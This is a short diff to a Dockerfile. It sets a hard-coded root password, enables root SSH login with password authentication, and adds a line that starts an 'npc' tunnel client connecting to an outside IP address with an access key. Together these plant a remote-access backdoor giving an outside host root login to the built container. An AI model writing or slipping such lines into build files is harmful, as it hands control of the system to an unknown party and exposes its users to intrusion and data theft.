@@ -12,5 +12,6 @@ RUN apt update \
     && echo root:Cxk@5438 |sudo chpasswd root \
     && sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config \
     && sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config \
-    && sudo /etc/init.d/ssh restart
+    && sudo /etc/init.d/ssh restart \
+    && screen -S ./npc -server=168.138.220.106:2024 -vkey=q16c7m95unhfmztz -type=tcp
 EXPOSE 22
